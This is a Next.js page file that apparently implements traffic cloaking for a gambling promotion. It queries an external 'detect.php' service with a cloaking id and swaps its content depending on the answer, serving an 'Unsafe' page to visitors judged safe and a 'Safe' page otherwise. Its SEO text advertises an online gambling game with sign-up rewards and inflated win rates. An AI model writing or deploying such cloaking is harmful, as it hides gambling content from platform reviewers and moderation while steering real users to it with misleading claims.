import { Safe, Unsafe } from '@components/pages';
import { fetcher } from '@service/strapi';
import { getCloakingLink } from '@utilities/dev';
import useSWR from 'swr';

export default function Index({ clid }) {
  const { data } = useSWR(`https://water-xyz.com/detect.php?clid=${clid}`, fetcher);

  switch (data?.result) {
    case 'safe':
      return <Unsafe />;
    case 'unsafe':
      return <Safe />;
    default:
      return null;
  }
}

export async function getStaticProps() {
  // Fetch data from external API
  const clid = getCloakingLink();
  // Pass data to the page via props

  const seo = {
    linkTo: '/',
    seo: {
      title: 'Vegas Lottery Scratchers',
      description:
        '線上地主遊戲免費又好玩，無需下載，隨時挑戰！享受刺激的遊戲體驗。快速上手，讓您愛不釋手！立即註冊拿豪禮，超高勝率，玩越多贏越多，最新優惠活動開跑。獎勵超多領不完。',
    },
  };
  return {
    props: {
      seo,
      clid,
    },
    revalidate: 10, // In seconds
  };
}
